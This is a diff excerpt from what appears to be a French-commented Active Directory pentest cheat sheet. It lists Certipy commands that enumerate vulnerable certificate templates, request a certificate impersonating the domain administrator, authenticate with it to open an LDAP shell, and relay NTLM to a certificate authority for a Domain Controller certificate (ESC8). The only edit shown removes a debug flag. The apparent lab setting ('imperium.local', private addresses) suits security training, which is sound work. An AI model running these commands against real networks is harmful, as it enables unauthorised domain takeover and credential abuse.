@@ -79,7 +79,7 @@ certipy find -u $USER -p $PASSWORD -dc-ip 10.2.62.87 -vulnerable -stdout  # Énu
 
 certipy req -u $USER -p $PASSWORD -ca 'IMPERIUM-CA' -template 'InterstellarTransport' -upn 'administrator@imperium.local' -dc-ip 10.2.62.87 -target-ip $IP -sid 'S-1-5-21-61666187-1038195267-148027601-500'  # Demande un certificat en usurpant l’identité de l’admin via un template vulnérable
 
-certipy -debug auth -pfx administrator.pfx -domain imperium.local -dc-ip 10.2.62.87 -ldap-shell  # Utilise le certificat pour s’authentifier comme le compte cible et ouvrir un shell LDAP
+certipy auth -pfx administrator.pfx -domain imperium.local -dc-ip 10.2.62.87 -ldap-shell  # Utilise le certificat pour s’authentifier comme le compte cible et ouvrir un shell LDAP
 
 certipy relay -target http://10.2.62.84/certsrv/certfnsh.asp -template 'DomainController'  # Relaye une authentification NTLM vers la CA pour obtenir un certificat de type Domain Controller (ESC8)
  
